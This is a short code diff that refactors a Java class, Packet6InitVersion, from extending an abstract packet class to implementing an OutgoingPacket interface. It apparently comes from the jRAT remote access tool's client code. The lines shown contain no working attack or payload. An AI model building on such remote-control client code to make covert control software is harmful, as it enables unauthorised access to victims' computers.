@@ -4,7 +4,7 @@ import jrat.client.Connection;
 import jrat.common.Version;
 
 
-public class Packet6InitVersion extends AbstractOutgoingPacket {
+public class Packet6InitVersion implements OutgoingPacket {
 
 	@Override
 	public void write(Connection con) throws Exception {
